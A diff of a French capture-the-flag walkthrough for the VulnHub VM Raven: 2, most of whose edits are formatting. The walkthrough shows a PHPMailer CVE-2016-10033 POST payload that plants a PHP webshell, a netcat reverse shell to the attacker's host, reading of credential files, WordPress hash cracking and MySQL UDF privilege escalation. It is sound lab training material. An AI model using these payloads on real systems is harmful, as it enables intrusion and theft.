@@ -2,11 +2,15 @@
 
 Lecture recommandée : [Walkthrough sur le challenge Raven: 1](/CTF-VulnLabs/raven1)
 
-[Raven: 2](https://www.vulnhub.com/entry/raven_2,269/) est une machine virtuelle vulnérable conçue par [le consultant en sécurité William McCann](https://wjmccann.github.io/), et publiée sur le site VulnHub au mois de novembre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (novembre 2018), il s'agit de la deuxième VM de la [série Raven](https://www.vulnhub.com/series/raven,176/).
+[Raven: 2](https://www.vulnhub.com/entry/raven_2,269/) est une machine virtuelle vulnérable, conçue par [le consultant en sécurité William McCann](https://wjmccann.github.io/) et publiée sur le site VulnHub au mois de novembre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. À l'heure où ces lignes sont écrites (novembre 2018), il s'agit de la deuxième VM de la [série Raven](https://www.vulnhub.com/series/raven,176/).
+
+## Synopsis
 
 Pourquoi deux ? Dans l'un de [ses billets de blog](https://wjmccann.github.io/blog/2018/11/09/Raven2), William McCann explique s'être rendu compte d'un petit souci [dans sa première VM](https://www.vulnhub.com/entry/raven-1,256/) : en effet, beaucoup de personnes l'ont résolue, mais pas de la manière escomptée. Plusieurs chemins menaient à root sur la VM Raven: 1, ce n'est plus le cas pour Raven: 2. Le pitch est le suivant : _Raven Security_ semble avoir appris de ses erreurs (tant mieux, en tant que leader mondial de la sécurité de l'information !) et a corrigé plusieurs vulnérabilités sur son site vitrine et son serveur. Cela dit, les patchs mis en oeuvre sont-ils suffisants ? À nous de le découvrir, c'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
-Pour commencer, l'outil [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Raven : il s'agit de 192.168.56.102.
+## Recherche d'informations
+
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Raven : il s'agit de 192.168.56.102.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -22,7 +26,7 @@ _____________________________________________________________________________
 192.168.56.102  08:00:27:27:30:11      1      60  PCS Systemtechnik GmbH
 ```
 
-Un scan [nmap](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de surprise ici : le résultat est quasi-identique à celui de la première VM : un service SSH est accessible via le port 22, et un serveur Web Apache via le port 80, qui héberge toujours le site vitrine de _Raven Security_.
+Un scan [__nmap__](https://nmap.org/book/man.html#man-description) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de surprise ici : le résultat est quasi-identique à celui de la première VM : un service SSH est accessible via le port 22, et un serveur Web Apache via le port 80, qui héberge toujours le site vitrine de _Raven Security_.
 
 ```console
 
@@ -56,11 +60,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 --snip--
 ```
 
-La page d'index est une présentation des activités de l'entreprise _Raven Security_ ; il n'y a toujours pas de fichier robots.txt, mais une recherche manuelle permet de lister les pages suivantes : index.html, about.html, service.html, contact.php et team.html. Sur cette dernière page Web, on y retrouve l'identité de chaque membre du staff qui, contrairement à celui de _[Bulldog Industries](CTF-VulnLabs/bulldog2)_, n'a pas été licencié après la compromission de leur serveur. L'onglet Blog redirige toujours vers un site WordPress, aussi vide de contenu que le premier.
+La page d'index est une présentation des activités de l'entreprise _Raven Security_ ; il n'y a toujours pas de fichier ```robots.txt```, mais une recherche manuelle permet de lister les pages suivantes : ```index.html```, ```about.html```, ```service.html```, ```contact.php``` et ```team.html```. Sur cette dernière page Web, on y retrouve l'identité de chaque membre du staff qui, contrairement à celui de _[Bulldog Industries](CTF-VulnLabs/bulldog2)_, n'a pas été licencié après la compromission de leur serveur. L'onglet Blog redirige toujours vers un site WordPress, aussi vide de contenu que le premier.
 
-![Affichage de l'image INDEX-Raven.png](INDEX-Raven.png)
+![Affichage de l'image INDEX-Raven.png](images/INDEX-Raven.png)
 
-Les outils [DIRB](https://tools.kali.org/web-applications/dirb), [nikto](https://cirt.net/nikto2-docs/) et [WordPress Security Scanner](https://wpscan.org/) ne révèlent toujours rien de spécial ; en revanche, une recherche manuelle a permis de trouver le nom d'un utilisateur, _michael_, qui a rédigé le premier post du blog... comme pour la VM Raven: 1. Deux attaques avec l'outil [Hydra](http://sectools.org/tool/hydra/) sont alors lancées : l'une sur le service SSH à la recherche du mot de passe Unix du compte _michael_ (s'il existe), l'autre sur l'interface d'administration du WordPress à la recherche du mot de passe du compte _michael_ (qui, lui, existe bien).
+Les outils [__DIRB__](https://tools.kali.org/web-applications/dirb), [__nikto__](https://cirt.net/nikto2-docs/) et [__WordPress Security Scanner__](https://wpscan.org/) ne révèlent toujours rien de spécial ; en revanche, une recherche manuelle a permis de trouver le nom d'un utilisateur, ```michael```, qui a rédigé le premier post du blog... comme pour la VM Raven: 1. Deux attaques avec l'outil [__Hydra__](http://sectools.org/tool/hydra/) sont alors lancées : l'une sur le service SSH à la recherche du mot de passe Unix du compte ```michael``` (s'il existe), l'autre sur l'interface d'administration du WordPress à la recherche du mot de passe du compte ```michael``` (qui, lui, existe bien).
 
 ```console
 root@blinils:~# hydra -l michael -P 500-worst-passwords.txt 192.168.56.102 \
@@ -95,25 +99,25 @@ Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret 
 1 of 1 target completed, 0 valid passwords found
 ```
 
-Enfer et damnation ! À tous les coups, la première mesure de sécurité prise par _Raven Security_ a été de modifier le mot de passe du compte michael, qui était... michael, évidemment. Il n'est donc plus possible de s'y connecter en SSH sur la VM Raven: 2. Il va donc falloir trouver un autre moyen d'obtenir un shell sur ce serveur ! Reprenons les outils un à un.
+Enfer et damnation ! À tous les coups, la première mesure de sécurité prise par _Raven Security_ a été de modifier le mot de passe du compte ```michael```, qui était... ```michael```, évidemment. Il n'est donc plus possible de s'y connecter en SSH sur la VM Raven: 2. Il va donc falloir trouver un autre moyen d'obtenir un shell sur ce serveur ! Reprenons les outils un à un.
 
 ```console
 root@blinils:~# dirb http://192.168.56.102 -r
 
 --snip--
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.56.102/ ----
-==> DIRECTORY: http://192.168.56.102/css/            
-==> DIRECTORY: http://192.168.56.102/fonts/          
-==> DIRECTORY: http://192.168.56.102/img/            
-+ http://192.168.56.102/index.html (CODE:200|SIZE:16819)                                                                            
-==> DIRECTORY: http://192.168.56.102/js/             
-==> DIRECTORY: http://192.168.56.102/manual/         
-+ http://192.168.56.102/server-status (CODE:403|SIZE:302)                                                                           
-==> DIRECTORY: http://192.168.56.102/vendor/         
-==> DIRECTORY: http://192.168.56.102/wordpress/      
+==> DIRECTORY: http://192.168.56.102/css/
+==> DIRECTORY: http://192.168.56.102/fonts/
+==> DIRECTORY: http://192.168.56.102/img/
++ http://192.168.56.102/index.html (CODE:200|SIZE:16819)
+==> DIRECTORY: http://192.168.56.102/js/
+==> DIRECTORY: http://192.168.56.102/manual/
++ http://192.168.56.102/server-status (CODE:403|SIZE:302)
+==> DIRECTORY: http://192.168.56.102/vendor/
+==> DIRECTORY: http://192.168.56.102/wordpress/
 
 --snip--
 ```
@@ -139,9 +143,9 @@ root@blinils:~# wpscan -u "http://192.168.56.102/wordpress"
 --snip--
 ```
 
-Rien de bien intéressant par ici, si ce n'est le troisième flag à récupérer dans le répertoire /uploads/2018/11 du site WordPress.
+Rien de bien intéressant par ici, si ce n'est le troisième flag à récupérer dans le répertoire ```/uploads/2018/11``` du site WordPress.
 
-Le premier flag se situe quant à lui dans le fichier PATH du répertoire /vendor, signe qu'il s'agit d'une bonne piste à explorer. On y retrouve des fichiers relatifs à [PHPMailer](https://en.wikipedia.org/wiki/PHPMailer), une bibliothèque logicielle d'envoi d'e-mails en PHP. Une brève recherche sur Internet révèle qu'il existe des vulnérabilités ET des exploits pour cette bibliothèque, en particulier la [CVE-2016-10033](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html) et ça tombe bien, la version de PHPMailer installée sur le serveur Raven: 2 est vulnérable, en témoignent les fichiers SECURITY.md et VERSION.
+Le premier flag se situe quant à lui dans le fichier ```PATH``` du répertoire ```/vendor```, signe qu'il s'agit d'une bonne piste à explorer. On y retrouve des fichiers relatifs à [PHPMailer](https://en.wikipedia.org/wiki/PHPMailer), une bibliothèque logicielle d'envoi d'e-mails en PHP. Une brève recherche sur Internet révèle qu'il existe des vulnérabilités ET des exploits pour cette bibliothèque, en particulier la [CVE-2016-10033](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html) et ça tombe bien, la version de PHPMailer installée sur le serveur Raven: 2 est vulnérable, en témoignent les fichiers ```SECURITY.md``` et ```VERSION```.
 
 ```console
 root@blinils:~# curl -s http://192.168.56.102/vendor/SECURITY.md | head -n 6
@@ -157,7 +161,7 @@ root@blinils:~# curl -s http://192.168.56.102/vendor/VERSION
 5.2.16
 ```
 
-La vulnérabilité, découverte par le chercheur en sécurité [Dawid Golunski](https://twitter.com/dawid_golunski), permet d'exécuter du code malveillant à distance (_Remote Code Execution_ a.k.a. RCE). En résumé, les informations fournies par l'utilisateur, via un formulaire d'inscription ou de contact, sont injectées dans la commande /usr/bin/sendmail exécutée côté serveur. L'attaque consiste à créer un fichier de log sur le serveur avec l'option -X (dans le champ e-mail), puis y adjoindre du code PHP (dans le corps du message) qui sera exécuté dans ledit fichier de log. En l'occurrence, l'exploitation du serveur Raven: 2 se fera via le formulaire contact.php. 
+La vulnérabilité, découverte par le chercheur en sécurité [Dawid Golunski](https://twitter.com/dawid_golunski), permet d'exécuter du code malveillant à distance (_Remote Code Execution_ a.k.a. RCE). En résumé, les informations fournies par l'utilisateur, via un formulaire d'inscription ou de contact, sont injectées dans la commande ```/usr/bin/sendmail``` exécutée côté serveur. L'attaque consiste à créer un fichier de log sur le serveur avec l'option ```-X``` (dans le champ ```e-mail```), puis y adjoindre du code PHP (dans le corps du message) qui sera exécuté dans ledit fichier de log. En l'occurrence, l'exploitation du serveur Raven: 2 se fera via le formulaire ```contact.php```. 
 
 ```console
 POST /contact.php HTTP/1.1
@@ -176,11 +180,11 @@ Connection: close
 action=submit&name=name&email="attacker\" -oQ/tmp/ -X/var/www/html/vendor/blinils.php some"@email.com&subject=subject&message=<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>
 ```
 
-Et hop ! On obtient un nouveau fichier dans le répertoire /vendor.
+Et hop ! On obtient un nouveau fichier dans le répertoire ```/vendor```.
 
-![Affichage de l'image INDEX-Vendor.png](INDEX-Vendor.png)
+![Affichage de l'image INDEX-Vendor.png](images/INDEX-Vendor.png)
 
-Le fichier nouvellement créé ressemble effectivement à un fichier de log. À un détail près : si on appelle ce fichier de log en renseignant correctement le paramètre _cmd_ dans l'URL, il est possible d'exécuter du code sur le serveur. Exemple avec la commande _id_ qui équivaut à _aWQ=_ en [base64](https://fr.wikipedia.org/wiki/Base64).
+Le fichier nouvellement créé ressemble effectivement à un fichier de log. À un détail près : si on appelle ce fichier de log en renseignant correctement le paramètre ```cmd``` dans l'URL, il est possible d'exécuter du code sur le serveur. Exemple avec la commande ```id``` qui équivaut à ```aWQ=``` en [base64](https://fr.wikipedia.org/wiki/Base64).
 
 ```console
 root@blinils:~# curl -s http://192.168.56.102/vendor/blinils.php?cmd=aWQ= | head -n 15
@@ -201,9 +205,9 @@ root@blinils:~# curl -s http://192.168.56.102/vendor/blinils.php?cmd=aWQ= | head
 01211 === CONNECT [127.0.0.1]
 ```
 
-![Affichage de l'image INDEX-Backdoor.png](INDEX-Backdoor.png)
+![Affichage de l'image INDEX-Backdoor.png](images/INDEX-Backdoor.png)
 
-Les commandes sont donc exécutées en tant que ```uid=33(www-data) gid=33(www-data) groups=33(www-data)``` c'est parfait. À présent, nous allons mettre en place [un reverse shell à l'aide de netcat](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/#Netcat) : le bout de code ```nc -e /bin/bash 192.168.56.101 12345``` va créer une connexion sur le port 12345 entre le serveur Raven: 2 (192.168.56.102) et notre propre machine (192.168.56.101). Pour cela, il faut transmettre cette ligne de commande via le paramètre cmd, et en base64 qui plus est.
+Les commandes sont donc exécutées en tant que ```uid=33(www-data) gid=33(www-data) groups=33(www-data)``` c'est parfait. À présent, nous allons mettre en place [un reverse shell à l'aide de netcat](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/#Netcat) : le bout de code ```nc -e /bin/bash 192.168.56.101 12345``` va créer une connexion sur le port 12345 entre le serveur Raven: 2 (192.168.56.102) et notre propre machine (192.168.56.101). Pour cela, il faut transmettre cette ligne de commande via le paramètre ```cmd```, et en base64 qui plus est.
 
 ```console
 root@blinils:~# echo -n "nc -e /bin/bash 192.168.56.101 12345" | base64
@@ -231,11 +235,11 @@ Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
 www-data@Raven:/var/www/html/vendor$ 
 ```
 
-Tout comme lors du premier challenge Raven, le fichier /etc/passwd témoigne de l'existence d'un deuxième utilisateur potentiellement intéressant : steven. D'autre part, le fichier de configuration wp-config.php nous donne le sésame de la base de données présente sur le serveur ; ça tombe bien, c'est le même que Raven: 1. Enfin, la recherche du mot-clé _flag_ sur le serveur a été concluante : les deuxième et troisième flags du CTF ont été (re)trouvés.
+Tout comme lors du premier challenge Raven, le fichier ```/etc/passwd``` témoigne de l'existence d'un deuxième utilisateur potentiellement intéressant : ```steven```. D'autre part, le fichier de configuration ```wp-config.php``` nous donne le sésame de la base de données présente sur le serveur ; ça tombe bien, c'est le même que Raven: 1. Enfin, la recherche du mot-clé ```flag``` sur le serveur a été concluante : les deuxième et troisième flags du CTF ont été (re)trouvés.
 
 ```console
 www-data@Raven:/var/www/html/vendor$ find / -type f -name "*flag*" 2>/dev/null
-<l/vendor$ find / -type f -name "*flag*" 2>/dev/null                         
+<l/vendor$ find / -type f -name "*flag*" 2>/dev/null
 /proc/kpageflags
 /proc/sys/kernel/acpi_video_flags
 /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
@@ -253,7 +257,7 @@ mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
 steven:x:1001:1001::/home/steven:/bin/sh
 
 www-data@Raven:/var/www/html/vendor$ cat /var/www/html/wordpress/wp-config.php | grep DB
-<l/vendor$ cat /var/www/html/wordpress/wp-config.php | grep DB               
+<l/vendor$ cat /var/www/html/wordpress/wp-config.php | grep DB
 define('DB_NAME', 'wordpress');
 define('DB_USER', 'root');
 define('DB_PASSWORD', 'R@v3nSecurity');
@@ -262,7 +266,7 @@ define('DB_CHARSET', 'utf8mb4');
 define('DB_COLLATE', '');
 ```
 
-On se connecte ainsi avec les identifiants trouvés, et on récupère le contenu de la table wp_users.
+On se connecte ainsi avec les identifiants trouvés, et on récupère le contenu de la table ```wp_users```.
 
 ```console
 www-data@Raven:/var/www/html/vendor$ mysql -u root -p
@@ -319,14 +323,14 @@ show tables;
 +-----------------------+
 12 rows in set (0.00 sec)
 
-mysql> select * from wp_users;
-select * from wp_users;
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
-| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
-|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
-|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
-+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
+mysql> select ID, user_login, user_pass, user_email, display_name from wp_users;
+select ID, user_login, user_pass, user_email, display_name from wp_users;
++----+------------+------------------------------------+-------------------+----------------+
+| ID | user_login | user_pass                          | user_email        | display_name   |
++----+------------+------------------------------------+-------------------+----------------+
+|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael@raven.org | michael        |
+|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. | steven@raven.org  | Steven Seagull |
++----+------------+------------------------------------+-------------------+----------------+
 2 rows in set (0.00 sec)
 
 mysql> exit
@@ -335,7 +339,7 @@ Bye
 www-data@Raven:/var/www/html/vendor$ 
 ```
 
-Avec un peu de chance, [John The Ripper](http://openwall.com/john/) ne fera qu'une bouchée de ces hashs.
+Avec un peu de chance, [__John The Ripper__](http://openwall.com/john/) ne fera qu'une bouchée de ces hashs.
 
 ```console
 root@blinils:~# cat pass-wordpress-raven.txt
@@ -369,9 +373,9 @@ Voici les commandes à réaliser sur le poste attaquant...
 
 ```console
 root@blinils:~# searchsploit mysql | grep local | grep UDF
-MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)              | exploits/linux/local/1181.c
-MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)             | exploits/linux/local/1518.c
-MySQL 4/5/6 - UDF for Command Execution                                             | exploits/linux/local/7856.txt
+MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)     | exploits/linux/local/1181.c
+MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)    | exploits/linux/local/1518.c
+MySQL 4/5/6 - UDF for Command Execution                                    | exploits/linux/local/7856.txt
 
 root@blinils:~# searchsploit -m 1518
   Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
@@ -430,7 +434,7 @@ insert into foo values(load_file('/tmp/raptor_udf2.so'));
 Query OK, 1 row affected (0.00 sec)
 
 mysql> select * from foo into dumpfile '/usr/lib//mysql/plugin/raptor_udf2.so';
-<to dumpfile '/usr/lib//mysql/plugin/raptor_udf2.so';                        
+<to dumpfile '/usr/lib//mysql/plugin/raptor_udf2.so';
 Query OK, 1 row affected (0.00 sec)
 
 mysql> create function do_system returns integer soname 'raptor_udf2.so';
@@ -469,6 +473,6 @@ ls -al /root/flag4.txt
 
 ```
 
-Merci beaucoup à William McCann pour cette VM améliorée !
+Merci beaucoup à [William McCann](https://wjmccann.github.io/) pour cette VM améliorée !
 
 Après Raven: 1, c'était très plaisant d'arriver jusqu'à root sans aucun mot de passe par défaut, ou de privilèges sudo abusifs. 
